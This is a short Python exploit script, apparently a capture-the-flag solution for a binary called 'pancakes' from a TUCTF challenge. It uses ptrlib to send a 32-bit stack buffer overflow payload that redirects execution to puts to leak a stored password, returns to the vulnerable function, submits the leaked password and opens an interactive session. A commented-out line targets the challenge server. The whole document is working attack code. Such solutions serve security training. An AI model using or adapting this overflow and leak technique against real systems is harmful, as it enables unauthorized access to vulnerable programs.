from ptrlib import *

elf = ELF("./pancakes")
sock = Process("./pancakes")
#sock = Socket("chal.tuctf.com", 30503)

payload = b'A' * 0x2c
payload += p32(elf.plt('puts'))
payload += p32(elf.symbol('pwnme'))
payload += p32(elf.symbol('password'))
sock.sendafter("> ", payload)
sock.recvline()
password = sock.recvline() + b'\n'
password += b'\x00' * (0x1a - len(password))

sock.sendafter("> ", password)

sock.interactive()
